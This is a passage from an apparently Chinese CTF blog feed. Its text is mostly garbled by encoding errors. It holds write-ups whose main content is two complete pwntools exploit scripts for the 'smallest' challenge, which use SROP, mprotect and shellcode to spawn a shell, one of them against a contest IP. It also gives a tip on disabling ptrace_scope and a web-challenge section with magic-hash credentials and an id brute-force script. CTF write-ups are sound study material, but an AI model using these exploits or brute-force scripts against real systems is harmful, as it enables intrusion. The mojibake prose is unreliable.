        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="smallest"><a href="#smallest" class="headerlink" title="smallest"></a>smallest</h2><p>è¿™ä¸ªé¢˜Jokeræ¹¿å‚…å’Œè¯´æœ‰ä¸‰ç§è§£æ³•ï¼Œæˆ‘åˆ†åˆ«å­¦ä¹ äº†å…¶ä¸­ä¸¤ç§è§£æ³•ã€‚</p><p>é¢˜ç›®å¼€äº†NXï¼Œ</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-360ichunqiu-oline.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-360ichunqiu-oline.jpg"></a></p><p>è¿™ä¸ªé¢˜ï¼Œä»£ç é‡å¾ˆå°‘ï¼Œæˆ‘ä»¬ä»æ±‡ç¼–ä¸­å°±èƒ½çœ‹æ‡‚é€»è¾‘ã€‚</p><p>xor rax ï¼Œrax å°†raxçš„å€¼è®¾ç½®ä¸º0ï¼Œä¹‹åçš„å°† raxçš„å€¼ä½œä¸ºè°ƒç”¨å·ï¼Œå³readçš„è°ƒç”¨å·ä¸º0ï¼Œè¯»å…¥æ•°æ®ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬çš„åˆæ­¥è®¾æƒ³å°±æ˜¯é€šè¿‡æ§åˆ¶raxï¼Œä¿®æ”¹è°ƒç”¨å·ï¼Œè°ƒç”¨ä¸åŒçš„å‡½æ•°ï¼Œèµ·åˆæƒ³èƒ½ä¸èƒ½æ§åˆ¶rdxï¼Œä¼ å…¥/bin/shç›´æ¥èµ·shellï¼Œä½†æ˜¯ï¼Œåœ¨gadgetä¸­ï¼Œå‘ç°äº†ä¸€ä¸ªè‡´å‘½çš„é—®é¢˜ã€‚</p><p>å› ä¸ºä»£ç å°‘å¾—å¯æ€œï¼Œèƒ½æ‰¾åˆ°gadgetä¹Ÿå°‘å¾—å¯æ€œï¼Œå¤§æ¦‚ä¹Ÿåªæœ‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov rsi,rsp</span><br><span class="line"></span><br><span class="line">mov rdi,rax</span><br><span class="line"></span><br><span class="line">mov edi,eax</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é—®é¢˜å°±æ˜¯ï¼Œæƒ³æ”¹å˜rdiï¼Œåªèƒ½æ”¹å˜raxï¼Œä½†æ˜¯ï¼Œraxä¸€å˜ rdiå°±ä¼šå˜ï¼Œè¿™æ ·ä¸€æ¥è°ƒç”¨å·ä¹Ÿå˜äº†ï¼Œå¹¶ä¸èƒ½è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„ã€‚æ‰€ä»¥æˆ‘ä»¬åªèƒ½ç”¨SROPè§£å†³è¿™ä¸ªé—®é¢˜äº†ã€‚</p><h3 id="ç¬¬ä¸€ç§è§£æ³•-mprotect"><a href="#ç¬¬ä¸€ç§è§£æ³•-mprotect" class="headerlink" title="ç¬¬ä¸€ç§è§£æ³• mprotect"></a>ç¬¬ä¸€ç§è§£æ³• mprotect</h3><p>è¿™ç§åšæ³•æ˜¯Jokerå¸ˆå‚…æ•™æˆ‘çš„ æˆ‘ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡äº†è§£è¿™ç§æ–¹æ³•</p><p>SROP + mprotect + shellcode</p><p>æˆ‘ä»¬é€šè¿‡mprotectï¼Œå°†ä¸å¯æ‰§è¡Œçš„textæ®µï¼Œä¿®æ”¹ä¸ºraxï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œæˆ‘ä»¬çš„shellcodeäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line">__author__ = <span class="string">&#x27;joker&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./smallest&quot;</span>)</span><br><span class="line"></span><br><span class="line">syscall_addr = <span class="number">0x4000BE</span></span><br><span class="line">start_addr = <span class="number">0x4000B0</span></span><br><span class="line"></span><br><span class="line">payload = p64(start_addr)</span><br><span class="line">payload += p64(start_addr)<span class="comment">#fill</span></span><br><span class="line">payload += p64(start_addr)<span class="comment">#fill</span></span><br><span class="line">r.send(payload)</span><br><span class="line">raw_input(<span class="string">&quot;joker&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write infor leak</span></span><br><span class="line">r.send(<span class="string">&quot;\xb3&quot;</span>)<span class="comment">#write 2 start_addr last byte</span></span><br><span class="line">data = r.recv(<span class="number">8</span>)</span><br><span class="line">data = r.recv(<span class="number">8</span>)</span><br><span class="line">stack_addr = u64(data)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[*]:stack:&#123;0&#125;&quot;</span>.format(hex(stack_addr))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_read</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = stack_addr</span><br><span class="line">frame.rdx = <span class="number">0x300</span></span><br><span class="line">frame.rsp = stack_addr</span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line"></span><br><span class="line">payload = p64(start_addr)</span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line">payload += str(frame)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">raw_input(<span class="string">&quot;joker&quot;</span>)</span><br><span class="line">payload = p64(<span class="number">0x4000B3</span>)<span class="comment">#fill</span></span><br><span class="line">payload += p64(<span class="number">0x4000B3</span>)<span class="comment">#fill</span></span><br><span class="line">payload = payload[:<span class="number">15</span>]</span><br><span class="line">r.send(payload)<span class="comment">#set rax=sys_rt_sigreturn</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_mprotect</span><br><span class="line">frame.rdi = (stack_addr&amp;<span class="number">0xfffffffffffff000</span>)</span><br><span class="line">frame.rsi = <span class="number">0x1000</span></span><br><span class="line">frame.rdx = <span class="number">0x7</span></span><br><span class="line">frame.rsp = stack_addr + <span class="number">0x108</span></span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line">payload = p64(start_addr)</span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line">payload += str(frame)</span><br><span class="line"></span><br><span class="line">payload += p64(stack_addr + <span class="number">0x108</span> + <span class="number">8</span>)</span><br><span class="line"><span class="comment">#payload += cyclic(0x100)#addr ====&gt; start_addr + 0x108</span></span><br><span class="line">payload += <span class="string">&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;</span><span class="comment">#shellcode</span></span><br><span class="line"></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">raw_input(<span class="string">&quot;joker&quot;</span>)</span><br><span class="line">payload = p64(<span class="number">0x4000B3</span>)<span class="comment">#fill</span></span><br><span class="line">payload += p64(<span class="number">0x4000B3</span>)<span class="comment">#fill</span></span><br><span class="line">payload = payload[:<span class="number">15</span>]</span><br><span class="line">r.send(payload)<span class="comment">#set rax=sys_rt_sigreturn</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="ç¬¬äºŒç§è§£æ³•-infoleak"><a href="#ç¬¬äºŒç§è§£æ³•-infoleak" class="headerlink" title="ç¬¬äºŒç§è§£æ³• infoleak"></a>ç¬¬äºŒç§è§£æ³• infoleak</h3><p>é€šè¿‡æ„é€ raxï¼Œä¿®æ”¹ä¸ºwriteçš„è°ƒç”¨å·ï¼Œæˆ‘ä»¬å¯ä»¥leakå‡ºæ ˆåœ°å€ï¼Œéšåï¼Œæˆ‘ä»¬å¯ä»¥åœ¨leakå‡ºçš„æ ˆåœ°å€å†™/bin/shï¼Œä¹‹åå°±å¯ä»¥èµ·shelläº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment">###</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">DEBUG = <span class="literal">False</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">DEBUG = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">main_arena_off = <span class="number">0x001B07B0</span></span><br><span class="line">binsh_off = <span class="number">0x158E8B</span></span><br><span class="line"></span><br><span class="line">logger = logging.getLogger()</span><br><span class="line">logger.setLevel(logging.DEBUG) <span class="comment"># set to INFO in release mode</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">r = process(<span class="string">&quot;./smallest&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#gdb.attach(r,&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#b *0x00000000004000BE</span></span><br><span class="line"><span class="comment">#b *0x00000000004000c0</span></span><br><span class="line"><span class="comment">#&#x27;&#x27;&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="comment">#r = remote(&quot;106.75.61.55&quot;,20000)</span></span><br><span class="line">r = remote(<span class="string">&quot;182.254.130.247&quot;</span>,<span class="number">10002</span>)</span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">main = <span class="number">0x00000000004000B0</span></span><br><span class="line">syscall = <span class="number">0x00000000004000BE</span></span><br><span class="line">r.send(p64(main)+p64(main)+p64(main))</span><br><span class="line">raw_input(<span class="string">&quot;stop&quot;</span>)</span><br><span class="line"><span class="comment">#time.sleep(2)</span></span><br><span class="line">r.send(p8(<span class="number">0xbb</span>))</span><br><span class="line">raw_input(<span class="string">&quot;stop&quot;</span>)</span><br><span class="line"><span class="comment">#time.sleep(2)</span></span><br><span class="line">stack_addr = int(unpack(r.recv()[<span class="number">16</span>:<span class="number">24</span>],<span class="string">&quot;all&quot;</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;%x&quot;</span>%stack_addr</span><br><span class="line">frame=SigreturnFrame(kernel=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">frame.rax=<span class="number">0</span></span><br><span class="line">frame.rdx=<span class="number">0x400</span></span><br><span class="line">frame.rcx=<span class="number">0</span></span><br><span class="line">frame.rsi=stack_addr</span><br><span class="line">frame.eflags=<span class="number">0x246</span></span><br><span class="line">frame.rdi=<span class="number">0</span></span><br><span class="line"><span class="comment">#frame.csgsfs=0x002b000000000033</span></span><br><span class="line">frame.r11=<span class="number">0x246</span></span><br><span class="line">frame.rsp=stack_addr</span><br><span class="line">frame.rip=<span class="number">0x00000000004000BE</span></span><br><span class="line">r.send(p64(main)+<span class="string">&quot;/bin/sh&quot;</span>+p8(<span class="number">0</span>)+bytes(frame))</span><br><span class="line">raw_input(<span class="string">&quot;stop&quot;</span>)</span><br><span class="line"><span class="comment">#time.sleep(1)</span></span><br><span class="line"></span><br><span class="line">r.send(p64(syscall)+<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#time.sleep(1)</span></span><br><span class="line"></span><br><span class="line">frame.rax=<span class="number">59</span></span><br><span class="line">frame.rdi=stack_addr+<span class="number">0x10</span></span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">r.send(p64(main)+<span class="string">&quot;/bin/sh&quot;</span>+p8(<span class="number">0</span>)+bytes(frame))</span><br><span class="line">raw_input(<span class="string">&quot;stop&quot;</span>)</span><br><span class="line"><span class="comment">#time.sleep(1)</span></span><br><span class="line">r.send(p64(syscall)+<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"><span class="comment">#raw_input(&quot;stop&quot;)</span></span><br><span class="line"><span class="comment">#time.sleep(1)</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="hiddenlove"><a href="#hiddenlove" class="headerlink" title="hiddenlove"></a>hiddenlove</h2><p>è¿™æ˜¯ Hitcon 2016 babyheabé¢˜æ”¹çš„ã€‚</p><p><a href="https://github.com/ctfs/write-ups-2016/tree/master/hitcon-ctf-2016/pwn/baby-heap-300">https://github.com/ctfs/write-ups-2016/tree/master/hitcon-ctf-2016/pwn/baby-heap-300</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 360æ˜¥ç§‹æ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è§£å†³å‡çº§pwntools  gdb.attachä¸èƒ½å¼¹èµ·gdb</title>
      <link href="after-upgrade-gdb-wont-attach-to-process.html"/>
      <url>after-upgrade-gdb-wont-attach-to-process.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h1><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/fix-gdb-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/fix-gdb-01.jpg"></a></p><p>å‘ç° <code>gdb.attach</code>å¼¹ä¸å‡ºgdbçª—å£äº†â€¦</p><p> åæ¥å‘ç°é—®é¢˜å‡ºåœ¨ubuntuèº«ä¸Šï¼Œ</p><p>Ubuntuå¼•å…¥äº†ä¸€ä¸ªè¡¥ä¸æ¥ç¦æ­¢érootç”¨æˆ·å¯¹éå­è¿›ç¨‹çš„è¿½è¸ª - å³ã€‚åªæœ‰ä½œä¸ºå¦ä¸€ä¸ªè¿›ç¨‹çš„çˆ¶è¿›ç¨‹çš„è¿›ç¨‹å¯ä»¥ä¸ºæ™®é€šç”¨æˆ·è¿½è¸ªå®ƒï¼Œè€Œrootä»ç„¶å¯ä»¥è¿½è¸ªæ¯ä¸ªè¿›ç¨‹ã€‚æ‰€ä»¥ä¸ºä»€ä¹ˆä½ å¯ä»¥ä½¿ç”¨gdbæ¥é€šè¿‡sudoæ¥é™„åŠ ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ç”¨rootæƒé™ï¼Œæ¥è¿è¡Œæˆ‘ä»¬çš„<code>gdb.attach</code></p><h1 id="è§£å†³"><a href="#è§£å†³" class="headerlink" title="è§£å†³"></a>è§£å†³</h1><p>ä½†æ˜¯ï¼Œæˆ‘ä»¬ä¸ä¹Ÿéå¾—ç”¨<code>sudo</code></p><h2 id="ä¸´æ—¶è§£å†³æ–¹æ¡ˆ"><a href="#ä¸´æ—¶è§£å†³æ–¹æ¡ˆ" class="headerlink" title="ä¸´æ—¶è§£å†³æ–¹æ¡ˆ"></a>ä¸´æ—¶è§£å†³æ–¹æ¡ˆ</h2><p><code>echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope</code></p><h1 id="é•¿ä¹…è§£å†³æ–¹æ¡ˆ"><a href="#é•¿ä¹…è§£å†³æ–¹æ¡ˆ" class="headerlink" title="é•¿ä¹…è§£å†³æ–¹æ¡ˆ"></a>é•¿ä¹…è§£å†³æ–¹æ¡ˆ</h1><p>ä¿®æ”¹ <code>/etc/sysctl.d/10-ptrace.conf</code></p><p>â€‹    ä¿®æ”¹å†…å®¹ <code>kernel.yama.ptrace_scope = 1</code> </p><p>â€‹    ç»“æœä¸º       <code>kernel.yama.ptrace_scope = 0    </code></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> ç¯å¢ƒé…ç½® </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwntools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬ä¸‰å±Šå…¨å›½ç½‘ç»œç©ºé—´å®‰å…¨æŠ€æœ¯å¤§èµ›(çº¿ä¸Šåˆèµ›)</title>
      <link href="cstc-xatu-writeup.html"/>
      <url>cstc-xatu-writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="ç¬¬ä¸‰å±Šå…¨å›½ç½‘ç»œç©ºé—´å®‰å…¨æŠ€æœ¯å¤§èµ›-çº¿ä¸Šåˆèµ›"><a href="#ç¬¬ä¸‰å±Šå…¨å›½ç½‘ç»œç©ºé—´å®‰å…¨æŠ€æœ¯å¤§èµ›-çº¿ä¸Šåˆèµ›" class="headerlink" title="ç¬¬ä¸‰å±Šå…¨å›½ç½‘ç»œç©ºé—´å®‰å…¨æŠ€æœ¯å¤§èµ›(çº¿ä¸Šåˆèµ›)"></a>ç¬¬ä¸‰å±Šå…¨å›½ç½‘ç»œç©ºé—´å®‰å…¨æŠ€æœ¯å¤§èµ›(çº¿ä¸Šåˆèµ›)</h1><p>##web 1 ç­¾åˆ°é¢˜<br>1.è€å¥—è·¯çœ‹æºç å‘ç°æ˜¯phpéšå£«è½¬æ¢ç›´æ¥ <code>Username=QNKCDZOï¼Œpassword=240610708</code> ï¼Œå¾—åˆ°ä¸‹ä¸€ä¸ªåœ°å€<a href="http://117.34.111.15:84/json.php">http://117.34.111.15:84/json.php</a><br>2.ç»§ç»­å³é”®çœ‹æºç <br><a href="http://i.imgur.com/uzIyIK5.png" class="gallery-item"><img src="http://i.imgur.com/uzIyIK5.png"></a></p><p>3.åˆæ˜¯å¼±ç±»å‹</p><h1 id="Web2-æŠ½æŠ½å¥–"><a href="#Web2-æŠ½æŠ½å¥–" class="headerlink" title="Web2 æŠ½æŠ½å¥–"></a>Web2 æŠ½æŠ½å¥–</h1><blockquote><p>æŠ½å¥–å‘— <a href="http://117.34.111.15/">http://117.34.111.15/</a></p></blockquote><p>çœ‹åˆ° <code>jQuery.js</code> æœ‰ç‚¹å¼‚å¸¸ï¼Œæ‰“å¼€æºç ï¼Œ<a href="https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html">è§£ç </a>å¾—åˆ°ä»¥ä¸‹ä»£ç ï¼š</p><p>ç„¶åç›´æ¥åœ¨æ§åˆ¶å°è¾“å…¥ <code>getFlag</code>ï¼Œå¾—åˆ° <code>flag</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">window</span>.getFlag=<span class="function"><span class="keyword">function</span>(<span class="params">text</span>)</span>&#123;  <span class="keyword">if</span>(text==<span class="string">&#x27;1&#x27;</span>)&#123;      alert(<span class="string">&quot;ä½ æœ€å‰å®³å•¦!å¯æƒœæ²¡flag&quot;</span>)  &#125;   <span class="keyword">if</span>(text==<span class="string">&#x27;2&#x27;</span>)&#123;      alert(<span class="string">&quot;ä½ å¤ªå‰å®³äº†,ç«Ÿç„¶æ˜¯äºŒç­‰å¥–&quot;</span>)   &#125;   <span class="keyword">if</span>(text==<span class="string">&#x27;3&#x27;</span>)&#123;      alert(<span class="string">&quot;ä½ å¥½å‰å®³,ä¸‰ç­‰å¥–å•Š&quot;</span>)  &#125;   <span class="keyword">if</span>(text==<span class="string">&#x27;flag&#x27;</span>)&#123;       alert(<span class="string">&quot;flag&#123;951c712ac2c3e57053c43d80c0a9e543&#125;&quot;</span>)     &#125;   <span class="keyword">if</span>(text==<span class="string">&#x27;0&#x27;</span>)&#123;      alert(<span class="string">&quot;å†æ¥ä¸€æ¬¡å§&quot;</span>)  &#125; &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="Web3-ç»§ç»­æŠ½"><a href="#Web3-ç»§ç»­æŠ½" class="headerlink" title="Web3 ç»§ç»­æŠ½"></a>Web3 ç»§ç»­æŠ½</h1><p>æŸ¥çœ‹æºä»£ç ï¼Œçœ‹ä»£ç </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$.get(<span class="string">&#x27;get.php?token=&#x27;</span> + $(<span class="string">&quot;#token&quot;</span>).val() + <span class="string">&quot;&amp;id=&quot;</span> + encode(md5(jsctf2)), <span class="function"><span class="keyword">function</span>(<span class="params">jsctf3</span>) </span>&#123;</span><br><span class="line">    alert(jsctf3[<span class="string">&#x27;text&#x27;</span>])</span><br><span class="line">&#125;, <span class="string">&#x27;json&#x27;</span>);</span><br></pre></td></tr></table></figure><p>äºæ˜¯æ„é€ è¯·æ±‚ <code>&#39;http://117.34.111.15:81/get.php?token=&#39;+token+&#39;&amp;id=&#39;+id</code> ï¼Œè¯•äº†ä¸‹ <code>encode(md5(&#39;1&#39;))ã€encode(md5(&#39;2&#39;))ã€encode(md5(&#39;3&#39;))</code>ï¼Œå‡æ²¡å‡ºæ¥ <code>flag</code> ï¼Œäºæ˜¯å†™äº† <code>python</code> è„šæœ¬ï¼Œè·‘æ„é€ å¥½çš„å­—å…¸</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:utf-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pyquery</span><br><span class="line"></span><br><span class="line">file = open(<span class="string">&#x27;zd.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> file.readlines():</span><br><span class="line">    id = line.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    url = <span class="string">&#x27;http://117.34.111.15:81/&#x27;</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, sdch, br&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;Cache-Control&#x27;</span>:<span class="string">&#x27;max-age=0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (iPhone; CPU iPhone OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B150 MicroMessenger/6.5.1 NetType/WIFI Language/zh_CN&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>:<span class="string">&#x27;zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    s = requests.Session()</span><br><span class="line"></span><br><span class="line">    r = s.get(url=url,headers=headers).text</span><br><span class="line"></span><br><span class="line">    c = pyquery.PyQuery(r)</span><br><span class="line"></span><br><span class="line">    token = c(<span class="string">&#x27;#token&#x27;</span>).val()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    url2 = <span class="string">&#x27;http://117.34.111.15:81/get.php?token=&#x27;</span>+token+<span class="string">&#x27;&amp;id=&#x27;</span>+id</span><br><span class="line"></span><br><span class="line">    r2 = s.get(url=url2,headers=headers)</span><br><span class="line">    str = r2.text</span><br><span class="line">    <span class="keyword">print</span> str.decode(<span class="string">&#x27;unicode_escape&#x27;</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>), id</span><br></pre></td></tr></table></figure><p>äºæ˜¯è·‘å‡º <code>flag</code>ï¼Œä¹Ÿå°±æ˜¯å½“ <code>encode(md5(&#39;147&#39;))</code> æ—¶ï¼Œ</p><h1 id="Web4-Wrong"><a href="#Web4-Wrong" class="headerlink" title="Web4  Wrong"></a>Web4  